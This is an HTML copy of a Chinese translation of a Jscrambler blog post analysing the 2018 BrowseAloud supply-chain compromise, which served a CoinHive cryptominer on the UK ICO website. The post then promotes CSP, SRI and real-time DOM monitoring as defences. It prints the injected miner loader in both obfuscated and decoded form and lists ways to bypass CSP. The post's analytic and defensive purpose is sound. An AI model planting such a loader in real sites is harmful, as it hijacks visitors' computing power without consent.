<html>
<head>
<title>ICO Case Study | Tackling Cryptojacking with Real-time Webpage Monitoring</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">ICO案例研究|通过实时网页监控应对密码劫持</h1>
<blockquote>原文：<a href="https://medium.com/hackernoon/ico-case-study-tackling-cryptojacking-with-real-time-webpage-monitoring-ac1ed5049c22?source=collection_archive---------36-----------------------#2018-02-15">https://medium.com/hackernoon/ico-case-study-tackling-cryptojacking-with-real-time-webpage-monitoring-ac1ed5049c22?source=collection_archive---------36-----------------------#2018-02-15</a></blockquote><div><div class="ef hi hj hk hl hm"/><div class="hn ho hp hq hr"><div class=""/><figure class="fi fk is it iu iv fe ff paragraph-image"><div role="button" tabindex="0" class="iw ix di iy bf iz"><div class="fe ff ir"><img src="../Images/20e286a4cd677bf785ce3491f22b17f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*rwD73XcRhqE857Xe.png"/></div></div></figure><p id="b93e" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">本周末，英国信息专员办公室网站ICO(<a class="ae ka" href="https://ico.org.uk/" rel="noopener ugc nofollow" target="_blank">https://ico.org.uk/</a>)被发现向其用户提供CoinHive密码挖掘器。CoinHive crypto miner是一个JavaScript，可以安装在任何挖掘加密的网站上(例如Monero — XMR)。</p><p id="50dc" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">显然，这不是ICO的本意，ICO是一个帮助保护英国用户隐私的机构。它是对ICO网站中使用的第三方提供商TextHelp的妥协的结果。在另一位安全专家伊恩·川普的提示后，这一行为被安全负责人、io和report-uri.com创始人<a class="ae ka" href="https://scotthelme.co.uk/protect-site-from-cryptojacking-csp-sri/" rel="noopener ugc nofollow" target="_blank">斯科特·赫尔姆</a>标记出来。</p><h1 id="697f" class="kb kc hu bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky dt translated">袭击</h1><p id="26ab" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">ICO的网站当时正在加载这个文件:<code class="eh le lf lg lh b">https://www.browsealoud.com/plus/scripts/ba.js</code>，问题就从这里开始了。通过像这样直接从第三方网站加载JavaScript，他们基本上为注入攻击打开了大门。这与是否信任第三方提供商无关，因为他们可能会在不知不觉中受到威胁，从而使攻击者能够将其用作注射工具。</p><p id="f0b8" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">这是添加到ba.js脚本中的内容:</p><pre class="li lj lk ll fq lm lh ln lo aw lp dt"><span id="a896" class="lq kc hu lh b fv lr ls l lt lu">window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x77\x72\x69\x74\x65"]("\x3c\x73\x63\x72\x69\x70\x74 \x74\x79\x70\x65\x3d\x27\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x27 \x73\x72\x63\x3d\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x6f\x69\x6e\x68\x69\x76\x65\x2e\x63\x6f\x6d\x2f\x6c\x69\x62\x2f\x63\x6f\x69\x6e\x68\x69\x76\x65\x2e\x6d\x69\x6e\x2e\x6a\x73\x3f\x72\x6e\x64\x3d"+window["\x4d\x61\x74\x68"]["\x72\x61\x6e\x64\x6f\x6d"]()+"\x27\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e");window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x77\x72\x69\x74\x65"]('\x3c\x73\x63\x72\x69\x70\x74\x3e \x69\x66 \x28\x6e\x61\x76\x69\x67\x61\x74\x6f\x72\x2e\x68\x61\x72\x64\x77\x61\x72\x65\x43\x6f\x6e\x63\x75\x72\x72\x65\x6e\x63\x79 \x3e \x31\x29\x7b \x76\x61\x72 \x63\x70\x75\x43\x6f\x6e\x66\x69\x67 \x3d \x7b\x74\x68\x72\x65\x61\x64\x73\x3a \x4d\x61\x74\x68\x2e\x72\x6f\x75\x6e\x64\x28\x6e\x61\x76\x69\x67\x61\x74\x6f\x72\x2e\x68\x61\x72\x64\x77\x61\x72\x65\x43\x6f\x6e\x63\x75\x72\x72\x65\x6e\x63\x79\x2f\x33\x29\x2c\x74\x68\x72\x6f\x74\x74\x6c\x65\x3a\x30\x2e\x36\x7d\x7d \x65\x6c\x73\x65 \x7b \x76\x61\x72 \x63\x70\x75\x43\x6f\x6e\x66\x69\x67 \x3d \x7b\x74\x68\x72\x65\x61\x64\x73\x3a \x38\x2c\x74\x68\x72\x6f\x74\x74\x6c\x65\x3a\x30\x2e\x36\x7d\x7d \x76\x61\x72 \x6d\x69\x6e\x65\x72 \x3d \x6e\x65\x77 \x43\x6f\x69\x6e\x48\x69\x76\x65\x2e\x41\x6e\x6f\x6e\x79\x6d\x6f\x75\x73\x28\'\x31\x47\x64\x51\x47\x70\x59\x31\x70\x69\x76\x72\x47\x6c\x56\x48\x53\x70\x35\x50\x32\x49\x49\x72\x39\x63\x79\x54\x7a\x7a\x58\x71\'\x2c \x63\x70\x75\x43\x6f\x6e\x66\x69\x67\x29\x3b\x6d\x69\x6e\x65\x72\x2e\x73\x74\x61\x72\x74\x28\x29\x3b\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e');</span></pre><p id="e8d3" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">该代码有一个非常简单的混淆，只使用下标符号将<code class="eh le lf lg lh b">window.document.write</code>转换为<code class="eh le lf lg lh b">window[‘document’][‘write’]</code>——随后使用字符串编码来隐藏所有敏感的字符串，如“document”和“write ”,以及对CoinHive的URL和代码的引用。</p><p id="0fe7" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">这是一个相反的版本:</p><pre class="li lj lk ll fq lm lh ln lo aw lp dt"><span id="8505" class="lq kc hu lh b fv lr ls l lt lu">window["document"]["write"]("&lt;script type='text/javascript' src='https://coinhive.com/lib/coinhive.min.js?rnd=" + window["Math"]["random"]() + "'&gt;&lt;/script&gt;"); window["document"]["write"]('&lt;script&gt; if (navigator.hardwareConcurrency &gt; 1){ var cpuConfig = {threads: Math.round(navigator.hardwareConcurrency/3),throttle:0.6}} else { var cpuConfig = {threads: 8,throttle:0.6}} var miner = new CoinHive.Anonymous(\'1GdQGpY1pivrGlVHSp5P2IIr9cyTzzXq\', cpuConfig);miner.start();&lt;/script&gt;');</span></pre><p id="4331" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">原来ICO并不是唯一受影响的网站。<a class="ae ka" href="https://publicwww.com/websites/browsealoud.com%2Fplus%2Fscripts%2Fba.js/" rel="noopener ugc nofollow" target="_blank">超过4000个网站</a>报告直接从browsealoud.com网站加载被感染的脚本。</p><p id="3a24" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">这与RiskIQ声称的针对jQuery CDN的所谓攻击没有太大区别，risk IQ声称，在注入被移除之前，该攻击是向直接从CDN加载jQuery的每个网站的每个用户提供RIG exploit kit。这对攻击者来说太有吸引力了，他们可以通过攻击动态加载的依赖关系来大规模危害用户。</p><p id="aef2" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">这些攻击的焦点似乎正在转向密码劫持。最近很多网站被入侵的例子。jQuery的博客就是<a class="ae ka" href="https://www.hackread.com/jquery-blog-hacked-coinhives-dns-compromised/" rel="noopener ugc nofollow" target="_blank">的一个例子</a>。对TextHelp的攻击只是最近的一起。</p><h1 id="b56d" class="kb kc hu bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky dt translated">使用CSP + SRI进行缓解</h1><p id="c790" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">正如Scott Helme所指出的，减轻这种情况的一种方法是向加载外部脚本的脚本元素添加子资源完整性(SRI)属性。他甚至建议使用CSP的<code class="eh le lf lg lh b">require-sri-for</code>指令来补充SRI标签的使用。</p><p id="5c12" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">这是一个很好的建议，但是如果依赖脚本需要定期更新的话，效果就不太好了，事实似乎就是这样。一个很好的折衷办法是使用CSP来限制加载脚本的域。</p><p id="5c2e" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">但这并不完美。这可能会给注入任意脚本留下空间，这取决于哪些域被列入白名单。Michele Spagnuolo和Lukas weicselbaum<a class="ae ka" href="https://www.youtube.com/watch?v=uf12a-0AluI" rel="noopener ugc nofollow" target="_blank">在这里</a>精彩地报道了这一点。但基本上，有很多方法可以做到这一点。几个例子:</p><ol class=""><li id="0325" class="lv lw hu je b jf jg jj jk jn lx jr ly jv lz jz ma mb mc md dt translated">JSONP回调端点</li><li id="b612" class="lv lw hu je b jf me jj mf jn mg jr mh jv mi jz ma mb mc md dt translated">使用AngularJS和其他JS框架绕过-有记录的CSP绕过可能允许攻击者在页面中注入任意JS</li><li id="fff3" class="lv lw hu je b jf me jj mf jn mg jr mh jv mi jz ma mb mc md dt translated">在白名单域上使用开放重定向，因为路径在重定向后会被CSP忽略</li></ol><p id="79ac" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">由此得出的结论是，基于白名单的CSP确实很难实现，熟练的攻击者可能会找到绕过它的方法。一个更好的解决方案是使用CSP nonces，这是一个base64编码的序列，在每次加载页面时必须是唯一的，并且必须设置为内联和外部脚本的属性。这样，注入的脚本无法预测有效的nonce，加载将会失败。然而，在这种攻击中，坏人可以轻松地注入整个coinhive.js文件，这将通过CSP(但不是SRI)。</p><p id="6620" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">无论如何，您仍然需要使用SRI来确保不加载无效的脚本，但是如果JS lib需要频繁更新，这也不是一个好的选择。您总是可以自己托管文件，但是在动态生成JavaScript的情况下，这并不总是可行的(无论如何，这是一种糟糕的做法)。</p><p id="7b0b" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">关于CSP，需要注意的是，<a class="ae ka" href="https://www.youtube.com/watch?v=vWaH4Mu1EF8&amp;t=2193s" rel="noopener ugc nofollow" target="_blank">任何基于头部的网络安全控制都可以被浏览器扩展</a>解除。</p><h1 id="9076" class="kb kc hu bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky dt translated">使用网页实时监控进行缓解</h1><p id="5203" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">如果没有可靠的方法来确保恶意代码或标记被注入到您的网站中，那么下一个最好的事情就是了解它并实时做出反应。这正是Jscrambler的<a class="ae ka" href="https://jscrambler.com/webpage-integrity" rel="noopener ugc nofollow" target="_blank">网页完整性</a>技术能够做到的。它监视网页DOM中的任何注入，并向后端的webhook报告。它检测任何变化，包括0天的威胁，而不仅仅是已知的注射。</p><p id="c0b0" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">在某些情况下，它还可以当场解除注射。起初，这可能不是一个永久的删除，但它非常有用，因为它不仅防止执行影响会话，还告诉您注入了什么。然后就有可能弄清楚这种注射最初是如何插入的，并采取措施永久地修复这种情况。</p><p id="1dfa" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">它类似于CSP报告接口，但它根本不使用CSP。有一些重叠，但是当你使用两者时，你得到最好的保护。网页完整性方法的优点是，与CSP相反，如果脚本改变并开始将脚本标签注入DOM，可以立即警告用户，从而允许实时反应。这在SRI不是一个选项的情况下(例如，脚本需要实时更新)是绝对相关的。</p><p id="1a21" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">恶意修改的ba.js不再从browsealoud.com提供，但我们的团队复制了攻击，强制受感染的<a class="ae ka" href="https://pastebin.com/AHyehgS7" rel="noopener ugc nofollow" target="_blank"> ba.js </a>版本(而不是当前版本)进入ICO的网站。同时，我们在ICO的网站中手动注入网页完整性嵌入代理来监控网页DOM。目标是捕捉<code class="eh le lf lg lh b">document.write</code>在ICO的网页DOM上登陆的输出并减轻攻击。</p><p id="a84a" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">我们不仅能够捕捉到注入的<code class="eh le lf lg lh b">&lt;script&gt;</code>加载CoinHive的脚本，还能捕捉到内联脚本初始化lib并启动挖掘。您可以在仪表板中看到这一点(见下图)，同时您会在后端收到一个通知，您可以据此配置安全策略。</p><figure class="li lj lk ll fq iv fe ff paragraph-image"><div role="button" tabindex="0" class="iw ix di iy bf iz"><div class="fe ff mj"><img src="../Images/29714facfe4f89b57555f9f5e9098286.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ofVSxSQku4xwwFsQ.png"/></div></div><figcaption class="mk ml fg fe ff mm mn bd b be z ek">Figure 1 — Webpage Integrity Dashboard showing one of the injections</figcaption></figure><p id="245e" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">以下视频是ICO密码劫持攻击的概念验证，以及如何通过实时网页监控检测到该攻击。</p><figure class="li lj lk ll fq iv"><div class="bz el l di"><div class="mo mp l"/></div></figure><h1 id="fdd6" class="kb kc hu bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky dt translated">结论</h1><p id="e21b" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">随着加密货币的日益普及(和价值)，攻击者开始转向窃取我们计算机的周期作为获取现金的一种方式。去年左右的新闻里到处都是密码劫持。<br/>此次TextHelp事件再次证明了这对攻击者有多么大的吸引力，尤其是如果他们能够破坏第三方依赖关系，并一击命中多个网站。我们肯定会在未来看到更多这样的攻击。</p><p id="9fc1" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">CSP有助于限制外部JavaScript在网站中的加载，但并不意味着保证它期望加载的脚本的完整性。SRI可以在这方面有所作为，但当脚本经常改变时，就很难维持了。</p><p id="e421" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">Jscrambler的<a class="ae ka" href="https://jscrambler.com/webpage-integrity" rel="noopener ugc nofollow" target="_blank">网页完整性</a>是一种新方法，它实时监控网页的DOM修改、JS中毒攻击、JS事件劫持和XSS，并向后端报告，允许webapp立即做出反应。有了它，我们能够证明我们可以从TextHelp的受损脚本中捕获注入，并能够通知ICO(或任何其他可能被攻击的<a class="ae ka" href="https://publicwww.com/websites/browsealoud.com%2Fplus%2Fscripts%2Fba.js/" rel="noopener ugc nofollow" target="_blank">网站</a>)。</p><p id="7821" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">最后，这里有一个“假设”练习:在这些攻击中，攻击者只关心使用终端用户的CPU来挖掘密码。但是，在网页中执行任意JavaScript的能力将允许攻击者收集用户访问的任何敏感信息或完全修改DOM，并欺骗用户放弃其凭据或执行一些不符合其最佳利益的操作。客户端注射是一个需要尽全力解决的问题。</p></div><div class="ab cl mq mr hc ms" role="separator"><span class="mt bw bk mu mv mw"/><span class="mt bw bk mu mv mw"/><span class="mt bw bk mu mv"/></div><div class="hn ho hp hq hr"><p id="5b24" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated"><em class="mx">原载于2018年2月15日</em><a class="ae ka" href="https://blog.jscrambler.com/ico-case-study-tackling-cryptojacking-with-real-time-webpage-monitoring/" rel="noopener ugc nofollow" target="_blank"><em class="mx">blog.jscrambler.com</em></a><em class="mx">。</em></p></div></div>    
</body>
</html>